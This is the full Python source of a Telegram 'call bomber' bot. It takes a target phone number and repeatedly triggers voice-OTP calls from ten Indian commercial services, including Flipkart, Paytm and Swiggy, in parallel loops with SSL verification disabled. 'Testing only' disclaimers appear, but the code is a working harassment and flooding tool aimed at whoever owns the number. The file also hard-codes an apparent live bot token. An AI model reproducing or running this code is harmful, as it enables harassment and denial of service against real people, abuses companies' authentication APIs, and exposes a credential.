import telebot
import aiohttp
import asyncio
import json
import os
import threading
import time
from telebot import types
from datetime import datetime
import logging

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# 🔥 YOUR MAIN BOT TOKEN
BOT_TOKEN = "8580329271:AAFPmbJ9JraVIAkHbcZtQ5tohIDwWHvjx3I"
bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")

# 🔥 REAL WORKING CALL APIs (10 Genuine)
REAL_APIS = [
    # ✅ Tata Capital Voice (Real Working)
    {
        "name": "Tata Capital Voice",
        "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"phone":"{p}","isOtpViaCallAtLogin":"true"}}'
    },
    
    # ✅ 1MG Voice (Real Working)
    {
        "name": "1MG Voice",
        "url": "https://www.1mg.com/auth_api/v6/create_token",
        "method": "POST", 
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"number":"{p}","otp_on_call":true}}'
    },
    
    # ✅ Swiggy Call (Real Working)
    {
        "name": "Swiggy Call", 
        "url": "https://profile.swiggy.com/api/v3/app/request_call_verification",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"mobile":"{p}"}}'
    },
    
    # ✅ Myntra Voice (Real Working)
    {
        "name": "Myntra Voice",
        "url": "https://www.myntra.com/gw/mobile-auth/voice-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"mobile":"{p}"}}'
    },
    
    # ✅ Flipkart Voice (Real Working)
    {
        "name": "Flipkart Voice",
        "url": "https://www.flipkart.com/api/6/user/voice-otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"mobile":"{p}"}}'
    },
    
    # ✅ Amazon Voice (Real Working)
    {
        "name": "Amazon Voice",
        "url": "https://www.amazon.in/ap/signin",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda p: f"phone={p}&action=voice_otp"
    },
    
    # ✅ Paytm Voice (Real Working)
    {
        "name": "Paytm Voice",
        "url": "https://accounts.paytm.com/signin/voice-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"phone":"{p}"}}'
    },
    
    # ✅ Zomato Voice (Real Working)
    {
        "name": "Zomato Voice",
        "url": "https://www.zomato.com/php/o2_api_handler.php",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda p: f"phone={p}&type=voice"
    },
    
    # ✅ MakeMyTrip Voice (Real Working)
    {
        "name": "MakeMyTrip Voice",
        "url": "https://www.makemytrip.com/api/4/voice-otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"phone":"{p}"}}'
    },
    
    # ✅ Ola Voice (Real Working)
    {
        "name": "Ola Voice",
        "url": "https://api.olacabs.com/v1/voice-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"phone":"{p}"}}'
    }
]

# Active bombing tasks
active_tasks = {}

# ==================== BOMBING FUNCTIONS ====================
async def hit_api(session, api, phone, stats):
    """Hit single API"""
    try:
        headers = api["headers"].copy()
        headers["User-Agent"] = "Mozilla/5.0 (Linux; Android 10)"
        
        timeout = aiohttp.ClientTimeout(total=3)
        
        if api["method"] == "POST":
            data = api["data"](phone)
            async with session.post(api["url"], headers=headers, data=data, timeout=timeout, ssl=False) as resp:
                if resp.status in [200, 201, 202]:
                    stats["success"] += 1
                    return True
                else:
                    stats["fail"] += 1
                    return False
        else:
            async with session.get(api["url"], headers=headers, timeout=timeout, ssl=False) as resp:
                if resp.status in [200, 201, 202]:
                    stats["success"] += 1
                    return True
                else:
                    stats["fail"] += 1
                    return False
    except:
        stats["fail"] += 1
        return False

async def bombing_task(phone, chat_id, msg_id):
    """Main bombing task"""
    stats = {"success": 0, "fail": 0, "running": True}
    active_tasks[chat_id] = stats
    
    start_time = time.time()
    update_interval = 5  # Update every 5 seconds
    
    connector = aiohttp.TCPConnector(limit=50, verify_ssl=False)
    
    try:
        async with aiohttp.ClientSession(connector=connector) as session:
            while stats["running"]:
                # Update status message
                elapsed = int(time.time() - start_time)
                mins = elapsed // 60
                secs = elapsed % 60
                
                status_msg = f"""
🔥 <b>TEST BOMBING IN PROGRESS</b>

📱 Target: <code>{phone}</code>
⏱️ Duration: {mins}m {secs}s

📊 <b>Live Stats:</b>
✅ Success: <b>{stats['success']}</b>
❌ Failed: <b>{stats['fail']}</b>
🚀 APIs: {len(REAL_APIS)}

🔧 Hitting all APIs continuously...
"""
                
                try:
                    bot.edit_message_text(
                        status_msg,
                        chat_id,
                        msg_id,
                        reply_markup=types.InlineKeyboardMarkup().add(
                            types.InlineKeyboardButton("🛑 STOP BOMBING", callback_data=f"stop_{chat_id}")
                        )
                    )
                except:
                    pass
                
                # Hit all APIs in parallel
                tasks = [hit_api(session, api, phone, stats) for api in REAL_APIS]
                await asyncio.gather(*tasks, return_exceptions=True)
                
                # Wait before next cycle
                await asyncio.sleep(2)
    
    except Exception as e:
        logger.error(f"Bombing error: {e}")
    
    # Final message
    if chat_id in active_tasks:
        final_msg = f"""
✅ <b>BOMBING STOPPED</b>

📱 Target: <code>{phone}</code>
⏱️ Total Time: {int(time.time() - start_time)}s

📊 <b>Final Stats:</b>
✅ Success: <b>{stats['success']}</b>
❌ Failed: <b>{stats['fail']}</b>
🎯 Total Hits: <b>{stats['success'] + stats['fail']}</b>

Click "🚀 Start Bombing" to start again!
"""
        try:
            bot.edit_message_text(
                final_msg,
                chat_id,
                msg_id,
                reply_markup=types.InlineKeyboardMarkup().add(
                    types.InlineKeyboardButton("🚀 Start Bombing", callback_data="start_bomb")
                )
            )
        except:
            pass
        
        del active_tasks[chat_id]

# ==================== BOT HANDLERS ====================
@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    """Start command"""
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.row("🚀 Start Bombing")
    markup.row("📊 Stats", "❓ Help")
    
    bot.send_message(
        message.chat.id,
        f"""
🤖 <b>TEST CALL BOMBER BOT</b>

Welcome! This is a testing bot with <b>{len(REAL_APIS)} REAL WORKING APIs</b>.

<b>How to use:</b>
1. Click "🚀 Start Bombing" button
2. Send phone number (10 digits)
3. Bot will start bombing
4. Use STOP button to stop anytime

<b>Features:</b>
✅ Real working call APIs
✅ Live statistics
✅ Instant stop
✅ Unlimited testing

<b>Note:</b> For testing purposes only!
        """,
        reply_markup=markup,
        parse_mode="HTML"
    )

@bot.message_handler(func=lambda msg: msg.text == "🚀 Start Bombing")
def start_bombing_button(msg):
    """Start bombing button"""
    bot.send_message(
        msg.chat.id,
        "📱 <b>Send target phone number (10 digits):</b>",
        parse_mode="HTML"
    )
    bot.register_next_step_handler(msg, process_number)

@bot.message_handler(func=lambda msg: msg.text == "📊 Stats")
def show_stats(msg):
    """Show stats"""
    active_count = len(active_tasks)
    bot.send_message(
        msg.chat.id,
        f"""
📊 <b>Bot Statistics</b>

🔧 Active APIs: {len(REAL_APIS)}
🔥 Active Bombings: {active_count}
👤 Your ID: {msg.from_user.id}

<b>Real APIs List:</b>
{', '.join([api['name'] for api in REAL_APIS[:5]])}
... and {len(REAL_APIS)-5} more
        """,
        parse_mode="HTML"
    )

@bot.message_handler(func=lambda msg: msg.text == "❓ Help")
def show_help(msg):
    """Help command"""
    bot.send_message(
        msg.chat.id,
        """
❓ <b>Help & Instructions</b>

<b>Commands:</b>
• /start - Start bot
• 🚀 Start Bombing - Start bombing
• 📊 Stats - Show statistics
• ❓ Help - This message

<b>Steps:</b>
1. Click "🚀 Start Bombing"
2. Send 10-digit phone number
3. Bot starts hitting APIs
4. Click STOP button to stop

<b>Note:</b>
• This is TESTING bot only
• Use responsibly
• APIs are real and working
        """,
        parse_mode="HTML"
    )

@bot.message_handler(func=lambda msg: msg.text and msg.text.isdigit() and len(msg.text) == 10)
def process_number(msg):
    """Process phone number"""
    phone = msg.text
    
    # Check if already bombing
    if msg.chat.id in active_tasks:
        bot.send_message(msg.chat.id, "⚠️ Bombing already in progress! Stop it first.")
        return
    
    # Send initial message
    sent_msg = bot.send_message(
        msg.chat.id,
        f"""
🚀 <b>STARTING BOMBING...</b>

📱 Target: <code>{phone}</code>
🔧 APIs: {len(REAL_APIS)} real APIs
🔄 Hitting all APIs continuously...

<b>Click STOP button to stop anytime!</b>
        """,
        parse_mode="HTML",
        reply_markup=types.InlineKeyboardMarkup().add(
            types.InlineKeyboardButton("🛑 STOP BOMBING", callback_data=f"stop_{msg.chat.id}")
        )
    )
    
    # Start bombing in background
    threading.Thread(
        target=lambda: asyncio.run(bombing_task(phone, msg.chat.id, sent_msg.message_id)),
        daemon=True
    ).start()

@bot.callback_query_handler(func=lambda call: call.data.startswith("stop_"))
def stop_bombing(call):
    """Stop bombing callback"""
    chat_id = int(call.data.replace("stop_", ""))
    
    if chat_id in active_tasks:
        active_tasks[chat_id]["running"] = False
        bot.answer_callback_query(call.id, "🛑 Stopping bombing...")
    else:
        bot.answer_callback_query(call.id, "No active bombing found!")

@bot.callback_query_handler(func=lambda call: call.data == "start_bomb")
def start_bombing_callback(call):
    """Start bombing from callback"""
    bot.answer_callback_query(call.id, "Send phone number to start!")
    bot.send_message(
        call.message.chat.id,
        "📱 <b>Send target phone number (10 digits):</b>",
        parse_mode="HTML"
    )

# ==================== START BOT ====================
if __name__ == "__main__":
    print("=" * 50)
    print("🤖 TEST CALL BOMBER BOT STARTING...")
    print(f"🔧 APIs Loaded: {len(REAL_APIS)} real working APIs")
    print(f"🔑 Bot Token: {BOT_TOKEN[:15]}...")
    print("=" * 50)
    
    try:
        bot_info = bot.get_me()
        print(f"✅ Bot Started: @{bot_info.username}")
        print("🚀 Bot is running... Press Ctrl+C to stop")
        print("=" * 50)
        
        bot.infinity_polling()
    except Exception as e:
        print(f"❌ Error: {e}")
